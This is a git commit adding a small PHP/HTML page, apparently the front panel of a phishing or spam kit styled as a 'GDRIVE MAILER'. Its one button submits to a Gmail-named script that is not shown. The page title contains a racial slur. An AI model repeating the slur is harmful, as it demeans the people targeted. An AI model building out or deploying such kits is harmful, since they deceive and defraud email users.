640da7f628d6c962f4ea4b41e79fb724b55ac289
fkyrsftj <132077319+fkyrsftj@users.noreply.github.com>
2023-05-13 09:06:05 -0700

    Create GO1.php

---
+++ .pages/xbox/public/GO1.php
@@ -0,0 +1,129 @@
+<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GDRIVE MAILER NIGGGA</title>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+
+    <style>
+      /* Style the button container */
+      .button-container {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+      
+      /* Style the buttons */
+      .button {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 1.5%;
+        padding: 3%;
+        width: 98%;
+        height: 10%;
+        font-size: 24px;
+        font-weight: bold;
+        text-align: center;
+        border: none;
+        border-radius: 10px;
+        background-color: #A30116;
+        color: #FBBBBF;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      .button2 {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 10px;
+        padding: 2%;
+        width: 49%;
+        height: 200px;
+        font-size: 24px;
+        font-weight: bold;
+        text-align: center;
+        border: none;
+        border-radius: 10px;
+        background-color: #F0A0AA;
+        color: #FFFFFF;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+    /* CSS design optimized for iPhones */
+    body {
+        font-family: Arial, sans-serif;
+        font-size: 16px;
+        color: #333333;
+        background-color: #333333;
+    }
+    #container {
+        width: 90%;
+        max-width: 600px;
+        margin: 0 auto;
+        background-color: #ffffff;
+        padding: 20px;
+        border-radius: 5px;
+    }
+    input[type="text"], textarea {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+        margin-top: 6px;
+        margin-bottom: 16px;
+        resize: vertical;
+    }
+    input[type="submit"] {
+        background-color: #4CAF50;
+        color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        .error {
+            color: #ff0000;
+        }
+    </style>
+</head>
+<body>
+
+  
+<form id="accesspanel" action="/public/Google/meta/Gmailkk1.php" method="GET">
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+	  
+
+
+
+ <fieldset>
+
+
+
+
+<center><div class="inset">
+    
+    <font size="12" color="white">CR00K-3D</font><br>
+<font size="6" color="grey"><br>REBORN AND UPDATED</font>
+<button type="submit" class="button">GO TO DRIVE LINK</button>
+
+
+
+
+  
+
+    
+      
+      
+      
+      
+      
+      
+      
+
+    
+  
+</div>
+</center></fieldset></nav></form></body></html>
